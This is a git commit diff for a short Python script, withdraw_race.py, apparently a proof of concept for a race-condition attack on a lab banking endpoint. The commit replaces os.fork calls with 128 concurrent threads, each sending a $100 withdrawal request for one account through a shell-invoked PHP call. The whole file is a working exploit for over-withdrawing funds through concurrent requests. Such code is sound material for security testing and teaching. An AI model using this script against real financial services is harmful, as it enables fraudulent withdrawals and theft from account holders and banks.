99d33fbcf46c2844c666b9658b44daba143da430
Lasith Diwanjana <78650003+diwanjana@users.noreply.github.com>
2022-04-07 23:22:28 +0530

    Using thread module instead of os.fork

--- withdraw_race.py
+++ withdraw_race.py
@@ -1,15 +1,13 @@
 import os
-# Withdraw 128 times with 128 concurrent process, $100 each process.
-os.fork() #2
-os.fork() #4
-os.fork() #8
-os.fork() #16
-os.fork() #32
-os.fork() #64
-os.fork() #128
+from threading import Thread
 
-url_test = 'http://domain1.sec/race/poc.php?user_code=BANK000001&amount=100'
+def thread():
+    url_test = 'http://domain1.sec/race/poc.php?user_code=BANK000001&amount=100'
+    print(os.popen('php -r ' + '"echo file_get_contents(\'' + url_test + '\');"').read())
 
-
-print os.popen('php -r ' + \
-			'"echo file_get_contents(\'' + url_test + '\');"').read()
+if __name__ == '__main__':
+    # Withdraw 128 times with 128 concurrent process, $100 each process.
+    for i in range(128):
+        p = Thread(target=thread)
+        p.daemon = True
+        p.start()
